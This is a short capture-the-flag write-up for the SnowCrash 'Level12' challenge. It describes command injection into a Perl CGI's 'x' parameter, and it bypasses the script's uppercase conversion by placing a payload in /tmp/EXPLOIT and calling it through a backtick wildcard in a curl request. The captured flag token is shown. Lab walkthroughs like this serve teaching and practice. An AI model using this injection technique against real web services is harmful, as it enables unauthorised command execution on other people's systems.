# Level12

We have a CGI running on port 4646.
It applies transformation on the `x` param and then uses it for a grep on `/tmp/xd`.
We can probably insert a shell command in the first argument using backticks.
However, since several transformation are made on our input, we have to bypass them.
Lets create a file named in uppercase in which our exploit will be written.
```shell
level12@SnowCrash:~$ echo "getflag > /tmp/flag12" > /tmp/EXPLOIT
```

Then to call our `EXPLOIT` we have to provide the absolute path but the path will be modified
by the script by switching to uppercase every characters. We can use a wildcard to point to our `EXPLOIT`
```shell
level12@SnowCrash:~$ curl 'localhost:4646/level12.pl?x=`/*/EXPLOIT`'
..level12@SnowCrash:~cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```